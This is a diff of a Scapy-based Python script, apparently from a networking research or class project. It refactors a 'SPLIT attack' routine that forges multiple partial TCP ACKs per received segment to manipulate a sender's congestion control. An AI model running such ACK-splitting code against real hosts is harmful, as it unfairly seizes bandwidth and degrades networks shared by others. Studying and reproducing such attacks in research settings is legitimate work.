@@ -96,11 +96,8 @@ def dup(pkt):
 
 ### Proper handling for packet with SPLIT attack.
 #########################################################
-def split(pkt) :
-  global DST_PORT, IP_DST, data, socket
-  if (check_pkt(pkt)):
-    return
-  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
+## Split ACK across several packets
+def get_split_acks(pkt):
   tcp_seg_len = data_len(pkt)
   ACK_delta = tcp_seg_len / 3 # use 3 for now
   nextACK_num = pkt[TCP].seq + tcp_seg_len
@@ -109,7 +106,15 @@ def split(pkt) :
     ACK_nums = range(pkt[TCP].seq + ACK_delta, nextACK_num, ACK_delta)
   if nextACK_num not in ACK_nums:
     ACK_nums.append(nextACK_num);
-  for ACK_num in ACK_nums:
+  return ACK_nums
+
+def split(pkt) :
+  global DST_PORT, IP_DST, data, socket
+  if (check_pkt(pkt)):
+    return
+  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
+  
+  for ACK_num in get_split_acks(pkt):
     ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
              seq=pkt[TCP].ack, ack=ACK_num, flags='A')
     socket.send(Ether() / ack_pkt)
